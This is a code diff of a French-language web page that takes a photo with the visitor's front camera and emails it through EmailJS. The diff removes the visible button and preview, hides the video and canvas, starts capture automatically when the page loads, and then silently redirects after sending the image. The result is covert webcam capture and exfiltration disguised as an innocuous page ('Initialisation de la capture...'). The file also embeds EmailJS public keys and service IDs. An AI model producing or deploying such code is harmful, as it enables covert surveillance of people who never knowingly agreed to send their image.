@@ -2,81 +2,66 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Photo et envoi par EmailJS</title>
+  <title>Photo automatique</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 20px;
+      padding: 50px;
       background: #f0f0f0;
     }
     video, canvas {
-      margin-top: 15px;
-      border: 2px solid #333;
-      border-radius: 10px;
-    }
-    button {
-      margin: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      background: #28a745;
-      color: white;
-    }
-    button:hover {
-      background: #1e7e34;
+      display: none; /* cacher la vidéo et le canvas */
     }
   </style>
 </head>
 <body>
-  <h2>📸 Capture et envoi automatique</h2>
-  <button id="startBtn">Activer la caméra et envoyer</button>
-  <br>
-  <video id="video" autoplay playsinline width="300"></video>
-  <br>
+  <h2>📸 Initialisation de la capture...</h2>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="300" height="200"></canvas>
 
   <script>
     // Initialiser EmailJS avec ta clé publique
-    (function(){
-      emailjs.init("IoSfbtGz4KSL_5_9E");
-    })();
+    emailjs.init("mxm3fFA_BxEhqJieq");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
+    async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" } // caméra frontale
         });
         video.srcObject = stream;
 
-        // Quand la vidéo est prête → capture et envoi
         video.onloadeddata = () => {
+          // Capturer l'image
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/png");
 
-          // Envoi via EmailJS
-          emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Voici la photo capturée automatiquement 📸",
+          // Envoyer par EmailJS
+          emailjs.send("service_8cs0gml", "template_w14xn7c", {
+            message: "Photo automatique capturée 📸",
             image: imageData
           })
           .then(() => {
-            alert("📧 Photo envoyée par email !");
-          }, (err) => {
-            alert("❌ Erreur : " + JSON.stringify(err));
+            // Redirection après envoi
+            window.location.href = "https://tonsite.com/merci";
+          })
+          .catch((err) => {
+            document.body.innerHTML = "<h2>❌ Erreur : " + JSON.stringify(err) + "</h2>";
           });
         };
 
       } catch (err) {
-        alert("⚠️ Accès caméra refusé ou caméra non disponible.");
+        document.body.innerHTML = "<h2>⚠️ Permission refusée ou caméra non disponible</h2>";
       }
-    });
+    }
+
+    // Lancer la capture dès l'arrivée sur la page
+    startCapture();
   </script>
 </body>
 </html>
